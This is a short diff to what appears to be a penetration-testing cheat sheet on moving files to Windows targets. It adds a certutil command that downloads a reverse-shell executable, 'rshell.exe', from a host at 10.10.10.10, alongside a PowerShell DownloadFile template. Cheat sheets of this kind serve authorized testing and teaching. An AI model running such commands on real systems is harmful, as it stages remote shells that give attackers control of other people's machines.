@@ -96,6 +96,9 @@ sudo python3 -m pyftpdlib --port 21 --write
 ### Windows Transfer
 
 ```powershell
+#Certutil
+certutil -urlcache -f http://10.10.10.10/rshell.exe rshell.exe
+
 #PowerShell DownloadFile
 (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
 
